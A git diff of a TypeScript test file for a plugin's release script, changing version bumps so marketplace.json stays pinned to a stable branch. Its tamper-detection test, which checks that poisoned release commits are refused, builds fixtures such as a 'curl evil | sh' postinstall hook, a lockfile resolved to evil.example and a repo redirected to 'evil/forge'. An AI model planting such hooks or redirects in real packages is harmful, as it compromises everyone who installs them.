@@ -17,7 +17,6 @@ import {
   insertSection,
   landOnDevelop,
   lastTag,
-  MARKETPLACE,
   nextVersion,
   parseArgs,
   pickReleasePr,
@@ -33,7 +32,7 @@ import {
   versionsLine,
   type Run,
 } from '../../../scripts/release.ts';
-import { Refusal } from '../../../scripts/main-update.ts';
+import { Refusal } from '../../../scripts/stable-tree.ts';
 
 const ROOT = path.resolve(import.meta.dirname, '..', '..', '..');
 const POSIX = { skip: process.platform === 'win32' && 'POSIX-only' };
@@ -54,15 +53,18 @@ const TWO = ["export const X = [", "  // a step's comment", "  { id: 'one', up: 
 const THREE = ['export const API_CHANGES = [', "  { id: 'api-2' },", "  { id: 'api-3' },", "  { id: 'api-4' },", '] as const;'].join('\n');
 const LISTS_SCHEMA = ['export const ARCHIVE_SCHEMA_VERSION = 1;', "export { CONFIG_SCHEMA_VERSION } from '../versions/config.ts';"].join('\n');
 
-/** The four files a bump rewrites, at `version`, with marketplace.json's forge ref at `ref`. */
-function versionTexts(version: string, ref: string): Record<string, string> {
+/** The three files a bump rewrites, at `version`. */
+function versionTexts(version: string): Record<string, string> {
   return {
     'package.json': `{\n  "name": "forge",\n  "version": "${version}",\n  "files": ["bin", "lib"],\n  "engines": { "node": ">=22.18" }\n}\n`,
     'package-lock.json': `{\n  "name": "forge",\n  "version": "${version}",\n  "lockfileVersion": 3,\n  "packages": {\n    "": {\n      "name": "forge",\n      "version": "${version}"\n    },\n    "node_modules/x": {\n      "version": "${version}"\n    }\n  }\n}\n`,
     '.claude-plugin/plugin.json': `{\n  "name": "forge",\n  "version": "${version}"\n}\n`,
-    '.claude-plugin/marketplace.json': `{\n  "name": "forge",\n  "plugins": [\n    {\n      "name": "forge",\n      "source": { "source": "url", "url": "https://github.com/o/forge.git", "ref": "${ref}" },\n      "category": "development"\n    }\n  ]\n}\n`,
   };
 }
+/** develop's marketplace.json, which names the stable branch for good: no release touches it. */
+const MARKETPLACE_TEXT = `{\n  "name": "forge",\n  "plugins": [\n    {\n      "name": "forge",\n      "source": { "source": "github", "repo": "maxwellmattryan/forge", "ref": "stable" },\n      "category": "development"\n    }\n  ]\n}\n`;
+/** The version files at `version`, marketplace.json and a CHANGELOG with `## <version>`. */
+const releaseFiles = (version: string) => ({ ...versionTexts(version), '.claude-plugin/marketplace.json': MARKETPLACE_TEXT, 'CHANGELOG.md': `# Changelog\n\n## ${version}\n\n- First.\n` });
 function writeFiles(dir: string, files: Record<string, string>): void {
   for (const [rel, text] of Object.entries(files)) {
     fs.mkdirSync(path.dirname(path.join(dir, rel)), { recursive: true });
@@ -88,31 +90,29 @@ test('nextVersion bumps by name or takes a greater X.Y.Z', () => {
   assert.ok(compareVersions('0.20.0', '1.0.0') < 0);
 });
 
-test('setVersion rewrites only the version lines and the marketplace ref', () => {
+test('setVersion rewrites only the version lines and leaves marketplace.json alone', () => {
   const dir = tmpDir('forge-release-bump-');
   try {
-    const rels = Object.keys(versionTexts('0.18.7', 'main'));
-    for (const ref of ['main', 'v0.18.7']) {
-      writeFiles(dir, versionTexts('0.18.7', ref));
-      setVersion(dir, '0.18.7', '0.19.0');
-      const want = versionTexts('0.19.0', 'v0.19.0');
-      // The lockfile's dependency at the same version is not a version line of the package.
-      want['package-lock.json'] = want['package-lock.json'].replace('"node_modules/x": {\n      "version": "0.19.0"', '"node_modules/x": {\n      "version": "0.18.7"');
-      assert.deepEqual(readFiles(dir, rels), want, `from ref ${ref}`);
-    }
+    const rels = Object.keys(versionTexts('0.18.7'));
+    writeFiles(dir, { ...versionTexts('0.18.7'), '.claude-plugin/marketplace.json': MARKETPLACE_TEXT });
+    setVersion(dir, '0.18.7', '0.19.0');
+    const want = versionTexts('0.19.0');
+    // The lockfile's dependency at the same version is not a version line of the package.
+    want['package-lock.json'] = want['package-lock.json'].replace('"node_modules/x": {\n      "version": "0.19.0"', '"node_modules/x": {\n      "version": "0.18.7"');
+    assert.deepEqual(readFiles(dir, rels), want);
+    assert.equal(fs.readFileSync(path.join(dir, '.claude-plugin/marketplace.json'), 'utf8'), MARKETPLACE_TEXT, 'marketplace.json byte for byte');
 
     // The same rewrite, on one file's text: what releaseCommitOf replays on a parent's bytes.
-    const texts = versionTexts('0.18.7', 'main');
-    assert.equal(rewriteVersion('package.json', texts['package.json'], '0.18.7', '0.19.0'), versionTexts('0.19.0', 'main')['package.json']);
-    assert.equal(rewriteVersion(MARKETPLACE, texts['.claude-plugin/marketplace.json'], '0.18.7', '0.19.0'), versionTexts('0.18.7', 'v0.19.0')['.claude-plugin/marketplace.json']);
+    const texts = versionTexts('0.18.7');
+    assert.equal(rewriteVersion('package.json', texts['package.json'], '0.18.7', '0.19.0'), versionTexts('0.19.0')['package.json']);
     assert.throws(() => rewriteVersion('README.md', '{}', '0.18.7', '0.19.0'), Refusal, 'a file no bump touches');
+    assert.throws(() => rewriteVersion('.claude-plugin/marketplace.json', MARKETPLACE_TEXT, '0.18.7', '0.19.0'), Refusal, 'marketplace.json is no bumped file');
 
-    // A refusal writes nothing: no forge plugin, no source.ref, or a version a file does not hold.
-    const before = versionTexts('0.18.7', 'main');
+    // A refusal writes nothing: a version a file does not hold.
+    const before = versionTexts('0.18.7');
     const rows: [string, Record<string, string>, string, RegExp][] = [
-      ['no forge plugin', { '.claude-plugin/marketplace.json': before['.claude-plugin/marketplace.json'].replace('"name": "forge",\n      "source"', '"name": "other",\n      "source"') }, '0.18.7', /\.claude-plugin\/marketplace\.json/],
-      ['no source.ref', { '.claude-plugin/marketplace.json': before['.claude-plugin/marketplace.json'].replace(', "ref": "main"', '') }, '0.18.7', /\.claude-plugin\/marketplace\.json/],
       ['a from no file holds', {}, '0.18.6', /package\.json/],
+      ['a plugin.json at another version', { '.claude-plugin/plugin.json': versionTexts('0.18.6')['.claude-plugin/plugin.json'] }, '0.18.7', /plugin\.json/],
     ];
     for (const [what, edits, from, error] of rows) {
       const files = { ...before, ...edits };
@@ -121,10 +121,10 @@ test('setVersion rewrites only the version lines and the marketplace ref', () =>
       assert.deepEqual(readFiles(dir, rels), files, `${what}: nothing written`);
     }
 
-    // The real version files bump cleanly by one patch.
+    // The real version files bump cleanly by one patch, and the real marketplace.json is not among them.
     const real = tmpDir('forge-release-real-');
     try {
-      for (const rel of rels) {
+      for (const rel of [...rels, '.claude-plugin/marketplace.json']) {
         fs.mkdirSync(path.dirname(path.join(real, rel)), { recursive: true });
         fs.copyFileSync(path.join(ROOT, rel), path.join(real, rel));
       }
@@ -136,7 +136,7 @@ test('setVersion rewrites only the version lines and the marketplace ref', () =>
       assert.equal(json('package-lock.json').version, next);
       assert.equal(json('package-lock.json').packages[''].version, next);
       assert.equal(json('.claude-plugin/plugin.json').version, next);
-      assert.equal(json('.claude-plugin/marketplace.json').plugins.find((p: any) => p.name === 'forge').source.ref, `v${next}`);
+      assert.equal(fs.readFileSync(path.join(real, '.claude-plugin/marketplace.json'), 'utf8'), fs.readFileSync(path.join(ROOT, '.claude-plugin/marketplace.json'), 'utf8'));
     } finally {
       fs.rmSync(real, { recursive: true, force: true });
     }
@@ -260,10 +260,10 @@ test('parseArgs takes one version, a notes file only with it, and --yes', () => 
   for (const bad of [['--notes-file', 'n.md'], ['minor', 'patch'], ['next'], ['minor', '--notes-file'], ['--force'], ['-y']]) assert.equal(parseArgs(bad), null, JSON.stringify(bad));
 });
 
-/** develop one commit past a tagged 1.0.0 release, with the version files, marketplace ref and CHANGELOG. */
+/** develop one commit past a tagged 1.0.0 release, with the version files, marketplace.json and CHANGELOG. */
 const developRepo = repoTemplate((dir) => {
   const git = (...args: string[]) => execFileSync('git', args, { cwd: dir, stdio: 'pipe' });
-  writeFiles(dir, { ...versionTexts('1.0.0', 'v1.0.0'), 'CHANGELOG.md': '# Changelog\n\n## 1.0.0\n\n- First.\n' });
+  writeFiles(dir, releaseFiles('1.0.0'));
   git('add', '-A');
   git('commit', '-qm', 'Release 1.0.0');
   git('tag', '-a', 'v1.0.0', '-m', 'Forge 1.0.0');
@@ -291,9 +291,9 @@ test('prepare commits the release on release/v<version> and leaves develop alone
     assert.equal(JSON.parse(at('package.json')).version, '1.1.0');
     assert.equal(JSON.parse(at('package-lock.json')).packages[''].version, '1.1.0');
     assert.equal(JSON.parse(at('.claude-plugin/plugin.json')).version, '1.1.0');
-    assert.equal(JSON.parse(at('.claude-plugin/marketplace.json')).plugins[0].source.ref, 'v1.1.0');
+    assert.equal(`${at('.claude-plugin/marketplace.json')}\n`, MARKETPLACE_TEXT, 'marketplace.json byte for byte');
     assert.equal(at('CHANGELOG.md'), '# Changelog\n\n## 1.1.0\n\n- New things.\n\n## 1.0.0\n\n- First.');
-    assert.deepEqual(out(repo, 'diff', '--name-only', develop, sha).split('\n').sort(), ['.claude-plugin/marketplace.json', '.claude-plugin/plugin.json', 'CHANGELOG.md', 'package-lock.json', 'package.json']);
+    assert.deepEqual(out(repo, 'diff', '--name-only', develop, sha).split('\n').sort(), ['.claude-plugin/plugin.json', 'CHANGELOG.md', 'package-lock.json', 'package.json']);
 
     assert.equal(out(repo, 'symbolic-ref', '--short', 'HEAD'), 'develop');
     assert.equal(out(repo, 'rev-parse', 'develop'), develop);
@@ -409,7 +409,7 @@ test('releaseCommitOf accepts only a release commit npm run release made, or its
       fs.writeFileSync(path.join(repo.dir, 'dashboard', 'dist', 'index.html'), '<!doctype html>\n');
       repo.git('add', '--force', 'dashboard/dist');
     };
-    writeFiles(repo.dir, { ...versionTexts('1.0.0', 'v1.0.0'), 'CHANGELOG.md': '# Changelog\n\n## 1.0.0\n\n- First.\n' });
+    writeFiles(repo.dir, releaseFiles('1.0.0'));
     repo.git('add', '-A');
     repo.git('commit', '-qm', 'Release 1.0.0');
     repo.git('checkout', '-qb', 'develop');
@@ -452,11 +452,12 @@ test('releaseCommitOf accepts only a release commit npm run release made, or its
     repo.git('commit', '-q', '--allow-empty', '-m', 'fix: only on main');
     const foreign = releaseOn(sha());
     // The right files, but not only the bump in them: a dependency fetched from elsewhere, a hook, a script, another
-    // plugin source, a marketplace ref left behind, an older section rewritten, a section that is not this version's.
+    // plugin source, an older section rewritten, a section that is not this version's.
     const lock = releaseOn(work, { edit: replaceIn('package-lock.json', '"node_modules/x": {', '"node_modules/x": {\n      "resolved": "https://evil.example/x.tgz",') });
     const plugin = releaseOn(work, { edit: replaceIn('.claude-plugin/plugin.json', '"name": "forge",', '"name": "forge",\n  "mcpServers": { "x": { "command": "curl" } },') });
-    const market = releaseOn(work, { edit: replaceIn('.claude-plugin/marketplace.json', 'github.com/o/forge.git', 'github.com/evil/forge.git') });
-    const stale = releaseOn(work, { edit: replaceIn('.claude-plugin/marketplace.json', '"ref": "v1.1.0"', '"ref": "v1.0.0"') });
+    // marketplace.json names stable for good: a release commit never touches it.
+    const market = releaseOn(work, { edit: replaceIn('.claude-plugin/marketplace.json', '"repo": "maxwellmattryan/forge"', '"repo": "evil/forge"') });
+    const pinned = releaseOn(work, { edit: replaceIn('.claude-plugin/marketplace.json', '"ref": "stable"', '"ref": "v1.1.0"') });
     const script = releaseOn(work, { edit: replaceIn('package.json', '"files"', '"scripts": { "postinstall": "curl evil | sh" },\n  "files"') });
     const history = releaseOn(work, { edit: replaceIn('CHANGELOG.md', '- First.', '- Rewritten.') });
     const heading = releaseOn(work, { notes: '## 1.1.1\n\n- Notes.' });
@@ -493,7 +494,7 @@ test('releaseCommitOf accepts only a release commit npm run release made, or its
       ['a main update over that lockfile', poisoned, '1.1.0', null],
       ['a plugin.json that gained a key', plugin, '1.1.0', null],
       ['a marketplace.json that names another repo', market, '1.1.0', null],
-      ['a marketplace ref left at the old tag', stale, '1.1.0', null],
+      ['a marketplace.json pinned to the new tag', pinned, '1.1.0', null],
       ['a package.json that gained a script', script, '1.1.0', null],
       ['a CHANGELOG that rewrote an older section', history, '1.1.0', null],
       ['a CHANGELOG section for another version', heading, '1.1.0', null],
